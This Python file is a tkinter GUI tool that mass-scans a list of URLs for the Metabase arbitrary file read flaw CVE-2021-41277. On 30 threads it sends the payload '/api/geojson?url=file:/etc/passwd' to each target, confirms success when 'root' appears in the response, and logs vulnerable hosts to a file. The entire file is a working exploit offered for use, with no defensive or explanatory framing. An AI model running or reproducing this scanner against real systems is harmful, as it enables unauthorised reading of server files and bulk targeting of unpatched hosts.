import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def metabase_readfile_exp(url):
    poc = r"""/api/geojson?url=file:/etc/passwd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            metabase_readfile_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            metabase_readfile_text.see(END)
            with open ("存在MetaBase任意文件读取漏洞(CVE-2021-41277)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            metabase_readfile_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            metabase_readfile_text.see(END)
    except Exception as err:
        metabase_readfile_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        metabase_readfile_text.see(END)
def get_metabase_readfile_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def metabase_readfile_gui():
    metabase_readfile = tk.Tk()
    metabase_readfile.geometry("910x450")
    metabase_readfile.title("MetaBase任意文件读取漏洞(CVE-2021-41277)一把梭")
    metabase_readfile.resizable(0, 0)
    metabase_readfile.iconbitmap('logo.ico')
    global metabase_readfile_text
    metabase_readfile_text = scrolledtext.ScrolledText(metabase_readfile,width=123, height=25)
    metabase_readfile_text.grid(row=0, column=0, padx=10, pady=10)
    metabase_readfile_text.see(END)
    addrs = get_metabase_readfile_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(metabase_readfile_exp, addr)
    metabase_readfile.mainloop()